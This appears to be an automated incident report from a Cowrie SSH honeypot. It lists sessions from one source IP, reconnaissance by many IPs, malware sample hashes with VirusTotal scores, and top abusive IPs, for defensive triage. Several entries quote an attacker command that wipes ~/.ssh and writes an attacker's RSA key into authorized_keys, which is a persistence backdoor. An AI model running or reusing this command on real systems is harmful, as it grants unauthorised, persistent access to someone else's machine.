| `2026-06-08 10:38:20` | `cowrie.command.failed` |
| `2026-06-08 10:38:20` | `cowrie.log.closed` |
| `2026-06-08 10:38:20` | `cowrie.session.params` |
| `2026-06-08 10:38:20` | `cowrie.command.input` |
| `2026-06-08 10:38:20` | `cowrie.session.file_download` |
| `2026-06-08 10:38:20` | `cowrie.log.closed` |
| `2026-06-08 10:38:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97a075d1e2e0

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-06-08 10:38 |
| **Last Seen** | 2026-06-08 10:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 10:38:21` | `cowrie.session.connect` |
| `2026-06-08 10:38:21` | `cowrie.client.version` |
| `2026-06-08 10:38:21` | `cowrie.client.kex` |
| `2026-06-08 10:38:21` | `cowrie.login.success` |
| `2026-06-08 10:38:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43572ee3d430

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-06-08 10:42 |
| **Last Seen** | 2026-06-08 10:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 10:42:06` | `cowrie.session.connect` |
| `2026-06-08 10:42:06` | `cowrie.client.version` |
| `2026-06-08 10:42:06` | `cowrie.client.kex` |
| `2026-06-08 10:42:06` | `cowrie.login.success` |
| `2026-06-08 10:42:06` | `cowrie.session.params` |
| `2026-06-08 10:42:06` | `cowrie.command.input` |
| `2026-06-08 10:42:06` | `cowrie.command.failed` |
| `2026-06-08 10:42:06` | `cowrie.log.closed` |
| `2026-06-08 10:42:06` | `cowrie.session.params` |
| `2026-06-08 10:42:06` | `cowrie.command.input` |
| `2026-06-08 10:42:06` | `cowrie.session.file_download` |
| `2026-06-08 10:42:06` | `cowrie.log.closed` |
| `2026-06-08 10:42:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab2b05a65457

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-06-08 10:42 |
| **Last Seen** | 2026-06-08 10:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 10:42:08` | `cowrie.session.connect` |
| `2026-06-08 10:42:08` | `cowrie.client.version` |
| `2026-06-08 10:42:08` | `cowrie.client.kex` |
| `2026-06-08 10:42:08` | `cowrie.login.success` |
| `2026-06-08 10:42:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da859e9b604e

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-06-08 10:49 |
| **Last Seen** | 2026-06-08 10:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 10:49:45` | `cowrie.session.connect` |
| `2026-06-08 10:49:45` | `cowrie.client.version` |
| `2026-06-08 10:49:45` | `cowrie.client.kex` |
| `2026-06-08 10:49:45` | `cowrie.login.success` |
| `2026-06-08 10:49:45` | `cowrie.session.params` |
| `2026-06-08 10:49:45` | `cowrie.command.input` |
| `2026-06-08 10:49:45` | `cowrie.command.failed` |
| `2026-06-08 10:49:45` | `cowrie.log.closed` |
| `2026-06-08 10:49:45` | `cowrie.session.params` |
| `2026-06-08 10:49:45` | `cowrie.command.input` |
| `2026-06-08 10:49:45` | `cowrie.session.file_download` |
| `2026-06-08 10:49:45` | `cowrie.log.closed` |
| `2026-06-08 10:49:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6428ec085c65

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-06-08 10:49 |
| **Last Seen** | 2026-06-08 10:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 10:49:47` | `cowrie.session.connect` |
| `2026-06-08 10:49:47` | `cowrie.client.version` |
| `2026-06-08 10:49:47` | `cowrie.client.kex` |
| `2026-06-08 10:49:47` | `cowrie.login.success` |
| `2026-06-08 10:49:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ef3ddb7b3fd

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-06-08 10:53 |
| **Last Seen** | 2026-06-08 10:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 10:53:40` | `cowrie.session.connect` |
| `2026-06-08 10:53:40` | `cowrie.client.version` |
| `2026-06-08 10:53:40` | `cowrie.client.kex` |
| `2026-06-08 10:53:40` | `cowrie.login.success` |
| `2026-06-08 10:53:40` | `cowrie.session.params` |
| `2026-06-08 10:53:40` | `cowrie.command.input` |
| `2026-06-08 10:53:40` | `cowrie.command.failed` |
| `2026-06-08 10:53:40` | `cowrie.log.closed` |
| `2026-06-08 10:53:40` | `cowrie.session.params` |
| `2026-06-08 10:53:40` | `cowrie.command.input` |
| `2026-06-08 10:53:40` | `cowrie.session.file_download` |
| `2026-06-08 10:53:40` | `cowrie.log.closed` |
| `2026-06-08 10:53:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59dfe953aa00

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-06-08 10:53 |
| **Last Seen** | 2026-06-08 10:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 10:53:41` | `cowrie.session.connect` |
| `2026-06-08 10:53:41` | `cowrie.client.version` |
| `2026-06-08 10:53:41` | `cowrie.client.kex` |
| `2026-06-08 10:53:42` | `cowrie.login.success` |
| `2026-06-08 10:53:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79c082f35fda

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-06-08 10:57 |
| **Last Seen** | 2026-06-08 10:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 10:57:37` | `cowrie.session.connect` |
| `2026-06-08 10:57:37` | `cowrie.client.version` |
| `2026-06-08 10:57:37` | `cowrie.client.kex` |
| `2026-06-08 10:57:37` | `cowrie.login.success` |
| `2026-06-08 10:57:37` | `cowrie.session.params` |
| `2026-06-08 10:57:37` | `cowrie.command.input` |
| `2026-06-08 10:57:37` | `cowrie.command.failed` |
| `2026-06-08 10:57:37` | `cowrie.log.closed` |
| `2026-06-08 10:57:37` | `cowrie.session.params` |
| `2026-06-08 10:57:37` | `cowrie.command.input` |
| `2026-06-08 10:57:37` | `cowrie.session.file_download` |
| `2026-06-08 10:57:37` | `cowrie.log.closed` |
| `2026-06-08 10:57:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9ebcc3a506c

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-06-08 10:57 |
| **Last Seen** | 2026-06-08 10:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 10:57:38` | `cowrie.session.connect` |
| `2026-06-08 10:57:38` | `cowrie.client.version` |
| `2026-06-08 10:57:38` | `cowrie.client.kex` |
| `2026-06-08 10:57:38` | `cowrie.login.success` |
| `2026-06-08 10:57:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `167.71.225[.]225` | **333** | 2026-06-08 06:46 | 2026-06-08 11:02 | 175m | 0 | `T1592` | 🟠 MEDIUM |
| `20.81.140[.]174` | **35** | 2026-06-08 04:26 | 2026-06-08 11:01 | 15m | 0 | `T1592` | 🟠 MEDIUM |
| `182.253.153[.]132` | **30** | 2026-06-08 08:12 | 2026-06-08 09:22 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `34.71.30[.]159` | **30** | 2026-06-08 08:14 | 2026-06-08 09:24 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.33.113[.]91` | **25** | 2026-06-08 04:20 | 2026-06-08 05:19 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `95.71.127[.]158` | **25** | 2026-06-08 07:57 | 2026-06-08 10:01 | 3m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `106.51.92[.]114` | **24** | 2026-06-08 10:06 | 2026-06-08 11:01 | 0m | 24 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.66.149[.]228` | **23** | 2026-06-08 04:23 | 2026-06-08 04:28 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `49.207.40[.]162` | **20** | 2026-06-08 09:19 | 2026-06-08 10:08 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.112[.]14` | **17** | 2026-06-08 06:38 | 2026-06-08 07:30 | 22m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `8.219.190[.]201` | **16** | 2026-06-08 09:32 | 2026-06-08 09:38 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.40.143[.]166` | **13** | 2026-06-08 06:33 | 2026-06-08 07:54 | 6m | 0 | `T1592` | 🟠 MEDIUM |
| `103.163.117[.]84` | **8** | 2026-06-08 04:20 | 2026-06-08 04:35 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `124.164.251[.]88` | **4** | 2026-06-08 07:03 | 2026-06-08 09:57 | 4m | 0 | `T1592` | 🟢 LOW |
| `203.23.199[.]88` | **4** | 2026-06-08 08:00 | 2026-06-08 08:11 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `45.82.78[.]108` | **4** | 2026-06-08 04:21 | 2026-06-08 04:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.217.128[.]63` | **3** | 2026-06-08 09:34 | 2026-06-08 09:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `115.190.46[.]94` | **2** | 2026-06-08 07:08 | 2026-06-08 07:09 | 1m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `18.217.187[.]126` | **2** | 2026-06-08 10:49 | 2026-06-08 11:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.139.100[.]75` | **2** | 2026-06-08 09:48 | 2026-06-08 09:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `58.6.206[.]239` | **2** | 2026-06-08 08:28 | 2026-06-08 08:32 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.186[.]195` | **2** | 2026-06-08 10:31 | 2026-06-08 10:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.96.195[.]62` | 1 | 2026-06-08 09:20 | 2026-06-08 09:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.59.94[.]199` | 1 | 2026-06-08 10:17 | 2026-06-08 10:17 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.75.77[.]231` | 1 | 2026-06-08 08:06 | 2026-06-08 08:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.230[.]7` | 1 | 2026-06-08 08:01 | 2026-06-08 08:01 | 31s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.148.49[.]82` | 1 | 2026-06-08 06:47 | 2026-06-08 06:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.135[.]189` | 1 | 2026-06-08 09:26 | 2026-06-08 09:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.105[.]254` | 1 | 2026-06-08 10:57 | 2026-06-08 10:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.225.217[.]138` | 1 | 2026-06-08 10:59 | 2026-06-08 10:59 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `154.81.14[.]172` | 1 | 2026-06-08 07:27 | 2026-06-08 07:27 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.220.38[.]154` | 1 | 2026-06-08 08:22 | 2026-06-08 08:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `219.151.187[.]107` | 1 | 2026-06-08 09:34 | 2026-06-08 09:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `220.132.49[.]76` | 1 | 2026-06-08 06:49 | 2026-06-08 06:49 | 30s | 0 | `T1592` | 🟢 LOW |
| `220.154.133[.]120` | 1 | 2026-06-08 10:58 | 2026-06-08 10:59 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.160.200[.]19` | 1 | 2026-06-08 06:00 | 2026-06-08 06:00 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.240.156[.]16` | 1 | 2026-06-08 07:54 | 2026-06-08 07:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `67.241.132[.]98` | 1 | 2026-06-08 06:33 | 2026-06-08 06:33 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `72.203.148[.]223` | 1 | 2026-06-08 07:02 | 2026-06-08 07:02 | 2s | 0 | `T1592` | 🟢 LOW |
| `81.108.143[.]170` | 1 | 2026-06-08 05:18 | 2026-06-08 05:18 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `220.132.49[.]76` | TW | Chunghwa Telecom Data Communication Business Group | **100** ⚠️ | 4 |
| `72.203.148[.]223` | US | Cox Communications | **100** ⚠️ | 3 |
| `220.154.133[.]120` | CN | China Telecom Group Corporation Qingdao Branch | **100** ⚠️ | 2 |
| `67.241.132[.]98` | US | Charter Communications Inc | **100** ⚠️ | 9 |
| `183.220.38[.]154` | CN | China Mobile Communications Corporation | **100** ⚠️ | 9 |
| `20.81.140[.]174` | US | Microsoft Corporation | **100** ⚠️ | 0 |
| `43.160.200[.]19` | SG | ACEVILLE PTE.LTD. | **100** ⚠️ | 50 |
